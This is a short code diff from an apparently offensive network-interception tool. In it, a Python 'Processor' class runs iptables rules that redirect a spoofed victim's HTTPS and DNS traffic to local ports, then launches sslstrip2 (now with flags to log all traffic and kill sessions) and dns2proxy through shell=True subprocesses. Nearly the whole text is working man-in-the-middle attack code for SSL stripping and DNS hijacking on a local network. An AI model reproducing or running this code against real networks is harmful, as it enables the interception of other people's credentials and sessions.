@@ -117,14 +117,13 @@ class Processor(object):
 						if self.arpspoof_status:
 							try:
 									#iptables redirect traffic to port that sslstrip are listening
-								os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000")
 								os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000")
 									#iptables redirect traffic to port that dns2proxy are listening
 								os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
 
 								#Start subprocess with shell=True with sslstrip2 and dns2proxy
 					               	       	with open("{}/log/sslstrip.log".format(self.path), "a+") as stdout:
-        	                       					self.p1 = subprocess.Popen(["python {}/sslstrip2/sslstrip.py -f -l 8000".format(self.path),"sslstrip"], shell=True, stdout=stdout, stderr=stdout)
+        	                       					self.p1 = subprocess.Popen(["python {}/sslstrip2/sslstrip.py -a -k -f -l 8000".format(self.path),"sslstrip"], shell=True, stdout=stdout, stderr=stdout)
 									self.sslstrip_status = True
 								with open("{}/log/dns2proxy.log".format(self.path),"a+") as stdout:
 									self.p2 = subprocess.Popen(["python {}/dns2proxy/dns2proxy.py".format(self.path),"dns2proxy"], shell=True, stdout=stdout, stderr=stdout)
